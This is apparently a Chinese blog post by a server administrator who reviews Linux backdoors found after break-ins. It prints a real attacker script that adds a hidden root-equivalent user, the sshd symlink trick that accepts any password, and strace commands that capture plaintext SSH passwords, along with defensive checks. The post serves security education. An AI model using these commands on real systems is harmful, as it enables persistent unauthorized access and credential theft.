@@ -1,0 +1,88 @@
+<h2>写在前面</h2><p data-pid="OndfMRJx">最近被黑客搞得很烦，实验室的服务器被渗透成了筛子！</p><figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-f5d61ea1d39a2c6bde4bef6c9a18b9cb_720w.jpg?source=d16d100b" data-caption="" data-size="normal" data-rawwidth="1165" data-rawheight="699" class="origin_image zh-lightbox-thumb" width="1165" data-original="https://picx.zhimg.com/v2-f5d61ea1d39a2c6bde4bef6c9a18b9cb_720w.jpg?source=d16d100b"></noscript><img src="data:image/svg+xml;utf8,&lt;svg%20xmlns='http://www.w3.org/2000/svg'%20width='1165'%20height='699'&gt;&lt;/svg&gt;" data-caption="" data-size="normal" data-rawwidth="1165" data-rawheight="699" class="origin_image zh-lightbox-thumb lazy" width="1165" data-original="https://picx.zhimg.com/v2-f5d61ea1d39a2c6bde4bef6c9a18b9cb_720w.jpg?source=d16d100b" data-actualsrc="https://pic1.zhimg.com/v2-f5d61ea1d39a2c6bde4bef6c9a18b9cb_720w.jpg?source=d16d100b"></figure><p data-pid="fypcAM83">但久病成良医：很多黑客没有来得及删除用户目录下的.bash_history，让我得以目睹他们所做的一切。我不仅收集到了四五款不同的挖矿程序，也从他们的操作中学到了一些有趣且实用的技术，比如今天要聊的后门。</p><p data-pid="hneizoU1">也是后知后觉，被接二连三攻击后才反应过来检查后门。黑客一旦拿下一台主机，一般会在里面留下一些隐藏的登录入口，在管理员发现并清除病毒之后，甚至修改登录密码之后仍然能够访问。这种长期可控的「肉鸡」账号甚至会被后续转让给其他黑客。</p><p data-pid="7NskCgSA">据我观察，最近几次攻击最常用的还是<b>创建用户</b>这种朴素的后门，尽管很容易被发现，但对付我这种小白足矣。除此之外，本文还补充了另外两种常见的后门方式：sshd软链接和strace后门。这篇文章只是作为导入，并不会罗列所有的后门以及防御方法，如果你此前对这些毫无了解，看完后稍有兴趣，这篇文章的目的就达到了。普及安全知识，人人有责！</p><h2>1 增加超级用户帐号</h2><p data-pid="sAaD694X">下面这段内容来自真实的攻击命令（靶机系统是Ubuntu 20.04 LTS）：</p><div class="highlight"><pre><code class="language-bash"><span></span><span class="k">if</span> <span class="o">[</span> <span class="k">$(</span>id -u<span class="k">)</span> <span class="o">=</span> <span class="m">0</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+   <span class="k">if</span> ! cat /etc/passwd <span class="p">|</span> grep -q <span class="s2">"</span><span class="si">${</span><span class="nv">user</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">then</span>
+   /usr/sbin/useradd -u0 -g0 -o -s /bin/bash <span class="nv">$user</span> <span class="p">;</span> usermod -aG sudo <span class="nv">$user</span>
+   yes <span class="s2">"</span><span class="nv">$pass</span><span class="s2">"</span> <span class="p">|</span> passwd <span class="nv">$user</span>
+   <span class="k">else</span>
+		:
+   <span class="k">fi</span>
+<span class="k">fi</span>
+</code></pre></div><p data-pid="Y2ZjHhVo">翻译过来就是：如果当前用户具有管理员权限，且用户列表里不包含指定用户名，则创建该用户。下面这句话会创建一个具有超级管理员权限的用户：</p><div class="highlight"><pre><code class="language-bash"><span></span>/usr/sbin/useradd -u0 -g0 -o -s /bin/bash <span class="nv">$user</span>
+</code></pre></div><p data-pid="azy4gg62">其中<code>-u0</code>代表用户UID和root一致，<code>-g0</code>表示用户组GID和root一致，<code>-o</code>表示允许创建的用户UID相同，<code>-s</code>用来指定用户登录时使用的shell，<code>$user</code>是新用户的用户名。useradd的参数含义和具体用法参考<a href="http://link.zhihu.com/?target=http%3A//www.51gjie.com/linux/1036.html" class=" wrap external" target="_blank" rel="nofollow noreferrer">linux useradd命令添加用户</a>。接下来使用usermod将用户添加到附属组群sudo，这一条也可以在useradd时使用-G参数实现。然后重点来了，下面这行语句自动设置了用户的密码：</p><div class="highlight"><pre><code class="language-bash"><span></span>yes <span class="s2">"</span><span class="nv">$pass</span><span class="s2">"</span> <span class="p">|</span> passwd <span class="nv">$user</span>
+</code></pre></div><p data-pid="5M4VKorq">其中<code>$pass</code>是密码的原文明文。一般来说，我们在单独使用passwd设置密码时，系统会要求用户从标准输入流键入密码和重复密码，以上语句可以让这一切静默执行。</p><p data-pid="vyDt7hnx">除此之外还有一些资料讨论过另一种方法，即使用useradd的<code>-p</code>参数指定密码。这时我们就只需要一行命令，但需要传入密码散列后的密文，有些不好理解：</p><div class="highlight"><pre><code class="language-bash"><span></span>useradd -u0 -g0 -o -s /bin/bash -G sudo hacker -p <span class="s1">'$1$abcdefg$3JfMR7QfWQ49dnUy2YZgL/'</span>
+</code></pre></div><p data-pid="lU5vlTc_">那么这串乱码一样的东西到底是什么呢？其实在创建用户的时候，系统会把新用户的信息保存在/etc/passwd文件末尾，同时把密码的散列信息保存在/etc/shadow中，后者只有管理员可以访问，在用户登录时用来校验密码的正确性。我们使用以下命令格式化地查看密码的前两列，其他列的介绍参考<a href="http://link.zhihu.com/?target=http%3A//c.biancheng.net/view/840.html" class=" wrap external" target="_blank" rel="nofollow noreferrer">Linux /etc/shadow（影子文件）内容解析（超详细）</a>：</p><div class="highlight"><pre><code class="language-bash"><span></span>cat /etc/shadow <span class="p">|</span> awk -F <span class="s1">':'</span> <span class="s1">'{printf "%-30s%-30s\n",$1,$2}'</span>
+<span class="c1"># ---------------------------------------------------------------</span>
+<span class="c1"># daemon                        *</span>
+<span class="c1"># bin                           *</span>
+<span class="c1"># sys                           *</span>
+<span class="c1"># sync                          *</span>
+<span class="c1"># games                         *</span>
+<span class="c1"># man                           *</span>
+<span class="c1"># ...</span>
+<span class="c1"># sshd                          *</span>
+<span class="c1"># hacker                        $1$abcdefg$3JfMR7QfWQ49dnUy2YZgL/</span>
+</code></pre></div><p data-pid="SkkXBaKk">这里出于隐私考虑略去了结果第一行的root。第一列是用户名，第二列是密码的散列信息。这里包含了一系列伪用户，他们的密码信息被设置成*或!，所以被锁定不能登录。看hacker这一行，发现里面有三个$符号，它作为分隔符把三种信息隔开：</p><div class="highlight"><pre><code class="language-bash"><span></span><span class="si">${</span><span class="nv">Hash</span><span class="p">方法</span><span class="si">}${</span><span class="nv">salt</span><span class="si">}${</span><span class="nv">Hash</span><span class="p">后的散列值</span><span class="si">}</span>
+</code></pre></div><p data-pid="dvBm2Zat">我们常用openssl的passwd工具来生成这条信息，从这个工具的参数文档中可以看出以上字段的含义：</p><div class="highlight"><pre><code class="language-bash"><span></span>openssl passwd -help
+<span class="c1"># ---------------------------------------------------------------------</span>
+<span class="c1"># Usage: passwd [options]</span>
+<span class="c1"># Valid options are:</span>
+<span class="c1">#  -help               Display this summary</span>
+<span class="c1">#  -in infile          Read passwords from file</span>
+<span class="c1">#  -noverify           Never verify when reading password from terminal</span>
+<span class="c1">#  -quiet              No warnings</span>
+<span class="c1">#  -table              Format output as table</span>
+<span class="c1">#  -reverse            Switch table columns</span>
+<span class="c1">#  -salt val           Use provided salt</span>
+<span class="c1">#  -stdin              Read passwords from stdin</span>
+<span class="c1">#  -6                  SHA512-based password algorithm</span>
+<span class="c1">#  -5                  SHA256-based password algorithm</span>
+<span class="c1">#  -apr1               MD5-based password algorithm, Apache variant</span>
+<span class="c1">#  -1                  MD5-based password algorithm</span>
+<span class="c1">#  -aixmd5             AIX MD5-based password algorithm</span>
+<span class="c1">#  -crypt              Standard Unix password algorithm (default)</span>
+<span class="c1">#  -rand val           Load the file(s) into the random number generator</span>
+<span class="c1">#  -writerand outfile  Write random data to the specified file</span>
+</code></pre></div><p data-pid="EZiYeI8u">其中密码生成算法即Hash方法，包括了-1、-5、-6等参数，分别对应MD5、SHA256、SHA512三种最常用的算法。而salt就是就是常用的「加盐」技巧中的「盐」值，通常是一个随机字符串，不了解的小伙伴自行百度吧。 后面的散列值就是利用指定Hash方法，使用指定salt计算出的指定字符串的散列结果。</p><div class="highlight"><pre><code class="language-bash"><span></span><span class="nb">echo</span> <span class="s1">'=nXabsaTszvpgtd67;tk'</span><span class="p">|</span>xargs openssl passwd -1 -salt abcdefg
+<span class="c1"># ---------------------------------------------------------------</span>
+<span class="c1"># $1$abcdefg$3JfMR7QfWQ49dnUy2YZgL/</span>
+</code></pre></div><p data-pid="yOZ_Rv-5">前面echo的东西怎么得到的呢？你可以设置成自己的密码，比如123456，也可以使用更专业的方式自动生成一个指定强度的密码：mkpasswd。这需要expect库，我手上的机器是mac，所以使用brew进行安装。安装之后，如果在使用时出现package require Expect报错，就在报错的源码文件里删除这行即可。mkpasswd用法参考<a href="http://link.zhihu.com/?target=https%3A//www.cnblogs.com/xiaoyongzhuo/p/7444303.html" class=" wrap external" target="_blank" rel="nofollow noreferrer">mkpasswd命令使用方法</a>。</p><div class="highlight"><pre><code class="language-bash"><span></span>mkpasswd -l <span class="m">20</span> -s <span class="m">2</span>
+<span class="c1"># --------------------</span>
+<span class="c1"># =nXabsaTszvpgtd67;tk</span>
+</code></pre></div><p data-pid="1_dYEVk4">我理解的使用mkpasswd的好处就是，不会掺杂任何个人信息，就算后门被识破，黑客也不会被人反向社会工程学、建立密码字典。入侵我的那位老哥就不懂这个道理，密码和用户名都起的很有个性：</p><div class="highlight"><pre><code class="language-bash"><span></span><span class="nv">user</span><span class="o">=</span><span class="s2">"kokojambos"</span>
+<span class="nv">pass</span><span class="o">=</span><span class="s2">"SuCKMYdICKoDFf123912399SsSsSjasjd12939@!ASDASD"</span>
+</code></pre></div><p data-pid="TA9yxbz2">有了这么复杂的密码，ssh登录的时候手动输入岂不是很麻烦？所以我们使用sshpass这个工具进行静默登录，实际上这也是ssh密码暴力破解的步骤之一。sshpass的安装参考<a href="http://link.zhihu.com/?target=https%3A//www.cnblogs.com/hoganhome/p/15207573.html" class=" wrap external" target="_blank" rel="nofollow noreferrer">mac下安装sshpass并配置自动登录</a>。</p><div class="highlight"><pre><code class="language-bash"><span></span>sshpass -p <span class="s1">'=nXabsaTszvpgtd67;tk'</span> ssh hacker@XX.XX.XX.XX
+</code></pre></div><p data-pid="EpoEW7rK">当然以上这一切顺利运行是有前提的，我们也可以从这个角度进行防御。首先可以定期检查/etc/shadow文件有没有异常，比如多出来几个允许登录的用户记录。其次，一劳永逸的做法是修改/etc/ssh/sshd_config文件，修改以下参数来禁用密码验证，只使用公钥验证：</p><div class="highlight"><pre><code class="language-at"><span></span><span class="nv">PasswordAuthentication</span> <span class="nv">no</span>
+<span class="nv">PubkeyAuthentication</span> <span class="nv">yes</span>
+</code></pre></div><h2>2 sshd软链接后门</h2><p data-pid="6NmzudkM">这个就比较奇妙了，我没有详细研究其中原理，但在我的机器上确实好用，参考了<a href="https://zhuanlan.zhihu.com/p/59022855" class="internal" target="_blank">duouyinsu：Linux、Windows权限维持常用后门学习总结</a>。当我们的/etc/ssh/sshd_config文件中允许使用PAM时：</p><div class="highlight"><pre><code class="language-bash"><span></span>UsePAM yes
+</code></pre></div><p data-pid="rloEf0k9">黑客只需要执行以下任意一条语句：</p><div class="highlight"><pre><code class="language-text"><span></span>ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345
+ln -sf /usr/sbin/sshd /tmp/chsh;/tmp/chsh -oport=12345
+ln -sf /usr/sbin/sshd /tmp/chfn;/tmp/chfn -oport=12345
+</code></pre></div><p data-pid="u_HqtreP">无需重启ssh服务，即可使用任意已知用户名远程登录：</p><div class="highlight"><pre><code class="language-bash"><span></span>ssh root@XX.XX.XX.XX -p <span class="m">12345</span>
+</code></pre></div><p data-pid="-0M3aKJs">以上命令使用任意密码皆可登录。所以我们一般要将UsePAM设为no，并在此之前检查和删除/tmp目录下的su、chsh、chfn等软链接。根据经验，黑客最常用的目录就是/tmp，所以一定要留意这里的异常，平时在检查目录时要加上-a参数将隐藏文件包括进来。</p><h2>3 Strace后门</h2><p data-pid="ZAaaealX">strace工具可以跟踪任何进程的系统调用和数据，所以也可以用作后门，用来记录ssh，su，sudo的数据。这个后门与前文的两种略有不同，不是用于直接登录，而是协助嗅探其他用户的信息，比如登录密码。下面以ssh监控为例，讲解如何获取登录密码的明文。</p><p data-pid="gy6kD6oA">首先找到sshd进程的PID：</p><div class="highlight"><pre><code class="language-bash"><span></span>ps -ef <span class="p">|</span> grep sshd
+<span class="c1"># -----------------------------------------------------------------</span>
+<span class="c1"># root     20789     1  0 22:04 ?        00:00:00 /usr/sbin/sshd -D</span>
+</code></pre></div><p data-pid="U2NN0Sm6">然后将监控日志写入文件/tmp/.ssh.log：</p><div class="highlight"><pre><code class="language-bash"><span></span>strace -f -p <span class="m">20789</span> -o /tmp/.ssh.log -e <span class="nv">trace</span><span class="o">=</span>read,write -s <span class="m">2048</span>
+<span class="c1"># -------------------------------------------------------------</span>
+<span class="c1"># strace: Process 20789 attached</span>
+</code></pre></div><p data-pid="BG-DL371">黑客一直挂着以上命令，直到某一时刻有用户使用密码方式SSH登录该主机，就能看到大量进程涌出：</p><div class="highlight"><pre><code class="language-text"><span></span>strace: Process 20857 attached
+...
+strace: Process 20931 attached
+strace: Process 20932 attached
+strace: Process 20933 attached
+strace: Process 20934 attached
+</code></pre></div><p data-pid="xa_OT5uo">此时中断strace，然后查看我们的日志。因为日志信息量太大，直接查看有些眼花缭乱，我们可以匹配关键字搜索一下：</p><div class="highlight"><pre><code class="language-bash"><span></span>cat /tmp/.ssh.log <span class="p">|</span> grep <span class="s1">'write(4, '</span>
+<span class="c1"># --------------------------------------------------------</span>
+<span class="c1"># ...</span>
+<span class="c1"># 20861 write(4, "\0\0\0\31\f", 5)        = 5</span>
+<span class="c1"># 20861 write(4, "\0\0\0\24=nXabsaTszvpgtd67;tk", 24) = 24</span>
+<span class="c1"># 20861 write(4, "\0\0\0\1f", 5)          = 5</span>
+<span class="c1"># 20861 write(4, "\0\0\5\361\32", 5 &lt;unfinished ...&gt;</span>
+<span class="c1"># ...</span>
+</code></pre></div><p data-pid="89a9-wzS">如果以上关键字不好用，还可以尝试：</p><div class="highlight"><pre><code class="language-bash"><span></span>cat /tmp/.ssh.log <span class="p">|</span> grep <span class="s1">'read(6, '</span>
+<span class="c1"># ---------------------------------------------------------</span>
+<span class="c1"># 20860 read(6, "\0\0\0\31", 4)           = 4</span>
+<span class="c1"># 20860 read(6, "\f\0\0\0\24=nXabsaTszvpgtd67;tk", 25) = 25</span>
+<span class="c1"># 20860 read(6,  &lt;unfinished ...&gt;</span>
+<span class="c1"># 20860 read(6, "f", 1)                   = 1</span>
+<span class="c1"># 20860 read(6, "\0\0\5\361", 4)          = 4</span>
+</code></pre></div><p data-pid="1gI31-zH">我们可以清晰地看到用户输入的密码明文：<code>=nXabsaTszvpgtd67;tk</code> </p><hr><p data-pid="mybNdkHe"><b>2023年7月7日更新</b></p><p data-pid="0H9teNqI">补充一个更方便的命令</p><div class="highlight"><pre><code class="language-text"><span></span>strace -f -p &lt;pid&gt; -e trace=read -s 2048 2&gt;&amp;1 | grep -Po '"\\(10|f)\\0\\0\\0\K[^"]+(?=")'
+</code></pre></div><p data-pid="Ix4kqDB_">将会输出用户名和密码，但注意前面会有一个<code>\</code>开头的随机字符，需要肉眼分析然后去掉。 </p>
